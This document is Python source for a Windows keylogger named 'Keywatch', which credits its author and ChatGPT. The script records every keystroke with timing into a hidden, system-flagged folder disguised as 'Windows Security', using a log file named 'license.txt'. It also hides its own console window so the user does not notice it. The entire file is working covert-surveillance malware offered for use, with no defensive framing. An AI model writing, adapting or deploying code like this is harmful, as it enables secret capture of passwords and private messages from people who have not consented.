
#██╗░░██╗███████╗██╗░░░██╗░██╗░░░░░░░██╗░█████╗░████████╗░█████╗░██╗░░██╗
#██║░██╔╝██╔════╝╚██╗░██╔╝░██║░░██╗░░██║██╔══██╗╚══██╔══╝██╔══██╗██║░░██║
#█████═╝░█████╗░░░╚████╔╝░░╚██╗████╗██╔╝███████║░░░██║░░░██║░░╚═╝███████║
#██╔═██╗░██╔══╝░░░░╚██╔╝░░░░████╔═████║░██╔══██║░░░██║░░░██║░░██╗██╔══██║
#██║░╚██╗███████╗░░░██║░░░░░╚██╔╝░╚██╔╝░██║░░██║░░░██║░░░╚█████╔╝██║░░██║
#╚═╝░░╚═╝╚══════╝░░░╚═╝░░░░░░╚═╝░░░╚═╝░░╚═╝░░╚═╝░░░╚═╝░░░░╚════╝░╚═╝░░╚═╝
#Made by Arkem using ChatGPT

import os
import sys
import datetime
import win32gui
import keyboard
import ctypes
import win32con
import win32api

KEY_MAP = {
    " ": "[SPACE]",
    "space": "[SPACE]",
    "enter": "[ENTER]",
    "esc": "[ESC]",
    "ctrl": "[CTRL]",
    "alt": "[ALT]",
    "alt gr": "[ALT GR]",
    "tab": "[TAB]",
    "shift": "[SHIFT]",
    "maj": "[SHIFT]",
    "backspace": "[BACKSPACE]",
    "caps lock": "[CAPS LOCK]",
    "verr.maj": "[CAPS LOCK]",
    "up": "[UP]",
    "haut": "[UP]",
    "down": "[DOWN]",
    "bas": "[DOWN]",
    "left": "[LEFT]",
    "gauche": "[LEFT]",
    "right": "[RIGHT]",
    "droite": "[LEFT]",
    "page up": "[PAGE UP]",
    "pg.suiv": "[PAGE UP]",
    "page down": "[PAGE DOWN]",
    "pg. prec": "[PAGE DOWN]",
    "home": "[HOME]",
    "end": "[END]",
    "fin": "[END]",
    "insert": "[INSERT]",
    "delete": "[DELETE]",
    "suppr": "[DELETE]",
    "windows gauche": "[LEFT WINDOWS]",
    "f1": "[F1]",
    "f2": "[F2]",
    "f3": "[F3]",
    "f4": "[F4]",
    "f5": "[F5]",
    "f6": "[F6]",
    "f7": "[F7]",
    "f8": "[F8]",
    "f9": "[F9]",
    "f10": "[F10]",
    "f11": "[F11]",
    "f12": "[F12]",
}

hidden_folder = os.path.join(os.environ['ProgramData'], 'Windows Security')
os.makedirs(hidden_folder, exist_ok=True)

attributes = win32con.FILE_ATTRIBUTE_HIDDEN | win32con.FILE_ATTRIBUTE_SYSTEM
win32api.SetFileAttributes(hidden_folder, attributes)

log_file = os.path.join(hidden_folder, 'license.txt')


def write_keys(keys_pressed, last_time, file):
    with open(file, "a") as f:
        if "[ENTER]" in keys_pressed:
            f.write("[ENTER]\n")
        else:
            current_time = datetime.datetime.now()
            time_diff = (current_time - last_time).total_seconds()
            if time_diff >= 1:
                time_str = f"({int(time_diff)} s)"
                if time_diff < 2:
                    time_str = f"({int(time_diff * 1000)} ms)"
                f.write(f"{time_str} {''.join(keys_pressed)}")
            else:
                f.write(''.join(keys_pressed))
        return current_time

def on_press(event):
    try:
        keys_pressed = []
        if event.name in KEY_MAP:
            keys_pressed.append(KEY_MAP[event.name])
        elif event.name.isprintable():
            keys_pressed.append(event.name)
        global last_time
        last_time = write_keys(keys_pressed, last_time, log_file)
    except Exception as e:
        print(f"Error: {e}")

def set_process_name():
    if hasattr(sys, 'frozen'):
        kernel32 = ctypes.WinDLL('kernel32')
        kernel32.SetConsoleTitleW("Keywatch")

def set_window_properties():
    hwnd = win32gui.GetForegroundWindow()
    win32gui.SetWindowText(hwnd, "Keywatch")
    win32gui.ShowWindow(hwnd, win32con.SW_HIDE)
    win32gui.SetWindowLong(hwnd, win32con.GWL_EXSTYLE, win32gui.GetWindowLong(hwnd, win32con.GWL_EXSTYLE) | win32con.WS_EX_TOOLWINDOW)

if __name__ == "__main__":
    set_process_name()
    set_window_properties()

    with open(log_file, "a") as f:
        f.write(f"\nLancement du script le {datetime.date.today()} à {datetime.datetime.now().strftime('%H:%M:%S')}\n")

    last_time = datetime.datetime.now()

    while True:
        keyboard.on_press(on_press)
        keyboard.wait()
